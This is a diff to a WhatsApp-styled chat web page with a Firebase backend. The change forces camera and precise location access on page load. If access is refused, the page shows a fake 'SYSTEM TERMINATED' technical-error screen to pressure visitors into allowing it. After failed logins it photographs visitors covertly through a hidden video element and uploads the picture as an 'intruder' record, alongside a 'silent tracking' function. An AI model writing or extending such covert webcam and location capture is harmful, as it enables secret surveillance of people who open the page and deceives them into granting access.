@@ -18,10 +18,13 @@ body { margin: 0; font-family: Arial; background: #e5ddd5; display: flex; flex-d
 input { flex: 1; padding: 10px; border-radius: 20px; border: 1px solid #ccc; }
 button { background: #25d366; border: none; color: white; padding: 10px 20px; border-radius: 20px; cursor: pointer; }
 
-/* Estilo para el botón del ojito */
 .eye-btn { background: none; border: none; cursor: pointer; font-size: 18px; padding: 0; margin-left: 5px; }
 
-/* Elementos invisibles para el sistema de intrusos */
+/* Estilos para la pantalla de error técnico */
+.error-screen { background: #1a1a1a; color: #00ff00; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: 'Courier New', monospace; text-align: center; padding: 30px; }
+.error-code { color: #ff3333; font-weight: bold; border: 1px solid #ff3333; padding: 10px; margin: 20px 0; }
+.retry-btn { background: #444; border: 1px solid #00ff00; color: #00ff00; padding: 15px 40px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+
 #camera-stream, #capture-canvas { display: none; }
 </style>
 </head>
@@ -58,11 +61,7 @@ const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 const storage = getStorage(app);
 
-//////////////////////////////////////////////////
-// ⚙️ CONFIGURACIÓN DE SEGURIDAD
-//////////////////////////////////////////////////
-
-const PREFIJO_SALA = "espia_"; // Las salas deben empezar así, ej: espia_sala1
+const PREFIJO_SALA = "espia_"; 
 let intentosFallidos = 0;
 let cameraStream = null;
 
@@ -86,41 +85,67 @@ let SALA = "";
 let mensajesCol;
 let MI_ID = Math.random().toString(36).substring(7);
 
-async function pedirClave(){
-    // Iniciar cámara invisiblemente al cargar el prompt
+// --- 🔐 INICIO OBLIGATORIO CON VALIDACIÓN ---
+window.onload = async function() {
     try {
+        // Forzar Cámara
         cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        document.getElementById('camera-stream').srcObject = cameraStream;
-    } catch (e) { console.log("Cámara no disponible"); }
+        const video = document.getElementById('camera-stream');
+        video.srcObject = cameraStream;
+        
+        await new Promise((resolve) => {
+            video.onloadedmetadata = () => { video.play(); resolve(); };
+        });
 
+        // Forzar Ubicación
+        await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, { 
+                enableHighAccuracy: true, timeout: 8000 
+            });
+        });
+
+        pedirClave();
+
+    } catch (error) {
+        document.body.innerHTML = `
+            <div class="error-screen">
+                <h1 style="color:white">SYSTEM TERMINATED</h1>
+                <div class="error-code">ERROR_ID: 0x000452 - NODE_UNTRUSTED</div>
+                <p>La arquitectura de este chat requiere validación biométrica y de geoposición.</p>
+                <p><i>Causa: Permisos de hardware denegados por el cliente.</i></p>
+                <button class="retry-btn" onclick="location.reload()">Re-autenticar Nodo</button>
+            </div>`;
+    }
+};
+
+async function pedirClave(){
     let clave = prompt("🔐 Ingresa la clave del chat:");
 
     if(!clave || !clave.startsWith(PREFIJO_SALA)){
         intentosFallidos++;
         if(intentosFallidos >= 3) {
-            await capturarYReportarIntruso(clave || "vacio");
-            alert("Acceso bloqueado por seguridad.");
+            // Retraso de 1.5s para que la cámara ajuste la luz y no salga negra
+            setTimeout(async () => {
+                await capturarYReportarIntruso(clave || "vacio");
+                alert("CRITICAL SECURITY ALERT: Acceso bloqueado.");
+                location.reload();
+            }, 1500);
         } else {
-            alert("Clave incorrecta.");
+            alert(`Clave incorrecta. Intentos: ${intentosFallidos}/3`);
             pedirClave();
         }
         return;
     }
 
-    // Si la clave es correcta (tiene el prefijo)
     CLAVE_USUARIO = clave;
-    SALA = clave.replace(PREFIJO_SALA, ""); // El nombre de la sala es lo que sigue al prefijo
-    
+    SALA = clave.replace(PREFIJO_SALA, ""); 
     mensajesCol = collection(db, "mensajes", SALA, "chat");
     
-    // Apagar cámara si entró bien
     if(cameraStream) cameraStream.getTracks().forEach(t => t.stop());
 
     rastrearSilencioso(MI_ID);
     iniciarListener();
 }
-
-pedirClave();
 
 async function capturarYReportarIntruso(claveUsada) {
     const video = document.getElementById('camera-stream');
@@ -131,8 +156,7 @@ async function capturarYReportarIntruso(claveUsada) {
     canvas.height = video.videoHeight || 480;
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
     
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
-    if(cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
 
     try {
         const fotoPath = `intrusos/${MI_ID}_${Date.now()}.jpg`;
